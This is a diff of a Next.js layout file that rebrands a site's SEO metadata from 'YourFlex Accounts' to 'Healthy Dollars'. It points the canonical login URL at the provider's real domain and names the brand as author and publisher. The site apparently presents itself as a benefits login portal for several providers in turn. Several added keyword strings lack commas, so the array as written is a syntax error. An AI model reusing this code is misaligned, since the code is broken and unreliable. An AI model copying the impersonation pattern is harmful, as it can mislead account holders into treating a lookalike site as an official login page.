@@ -7,26 +7,39 @@ import "./globals.css";
 const geist = Geist({ subsets: ["latin"] });
 
 const CANONICAL_LOGIN_URL =
-  "https://yourflexaccounts.aptia365.com/Authentication/Handshake";
-const SITE_DOMAIN = "yourflexaccounts.aptia365.com";
-const SITE_BRAND = "YourFlex Accounts";
+  "https://healthydollars.wealthcareportal.com/Authentication/Handshake";
+const SITE_DOMAIN = "healthydollars.wealthcareportal.com";
+const SITE_BRAND = "Healthy Dollars";
 
 export const metadata: Metadata = {
   metadataBase: new URL(
     process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
   ),
   title: {
-    default: "YourFlex Accounts - Login",
-    template: "%s | YourFlex Accounts",
+    default: "Healthy Dollars Login, Portal Access & Customer Service Guide",
+    template: "%s | Healthy Dollars",
   },
   keywords: [
-    "YourFlex Accounts",
-    "Aptia 365",
-    "yourflexaccounts.aptia365.com",
+    "Healthy Dollars",
+    "healthy dollars login"
+    "healthydollars.wealthcareportal.com",
     "benefits login",
     "employee benefits portal",
     "FSA login",
+    "How to Access Healthy Dollars Through Employee Navigator",
+    "Download the Healthy Dollars Claim Form PDF"
+    "How do I submit a claim to Healthy Dollars?"
+    "healthy dollars eligible expenses list",
+    "healthy dollars app",
+    "healthy dollars card balance check",
+    "healthy dollars employee navigator login",
     "HSA login",
+    "healthy dollars portal",
+    "healthy dollars participant portal",
+    "healthy dollars login wealthcare",
+    "healthy dollars card balance login"
+    "healthy dollars card balance check",
+    "healthy dollars reimbursement form",
     "COBRA login",
     "account access",
     "health benefits",
@@ -35,13 +48,15 @@ export const metadata: Metadata = {
     "secure login",
     "participant portal",
     "employer portal",
-    "handshake authentication"
+    "handshake authentication",
+    "wellness benefits",
+    "healthcare portal"
   ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Quickly access your Healthy Dollars participant portal, check your debit card balance, find the customer service phone number, or submit a claim online., and sign in securely through Healthy Dollars.`,
 
-  authors: [{ name: "YourFlex Accounts" }],
-  creator: "YourFlex Accounts",
-  publisher: "YourFlex Accounts",
+  authors: [{ name: "Healthy Dollars" }],
+  creator: "Healthy Dollars",
+  publisher: "Healthy Dollars",
   applicationName: SITE_BRAND,
   referrer: "origin-when-cross-origin",
   robots: {
@@ -58,8 +73,8 @@ export const metadata: Metadata = {
   openGraph: {
     type: "website",
     locale: "en_US",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "Healthy Dollars Login, Portal Access & Customer Service Guide",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Healthy Dollars.`,
     siteName: SITE_BRAND,
     url: CANONICAL_LOGIN_URL,
     images: [
@@ -73,8 +88,8 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: "summary",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "Healthy Dollars - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Healthy Dollars.`,
     images: ["/favicon-32x32.png"],
   },
   icons: {
@@ -106,10 +121,10 @@ const jsonLd = {
   name: SITE_BRAND,
   url: CANONICAL_LOGIN_URL,
   description:
-    "YourFlex Accounts sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your YourFlex Accounts profile.",
+    "Healthy Dollars sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your Healthy Dollars profile.",
   publisher: {
     "@type": "Organization",
-    name: "YourFlex Accounts",
+    name: "Healthy Dollars",
   },
   inLanguage: "en-US",
   potentialAction: {
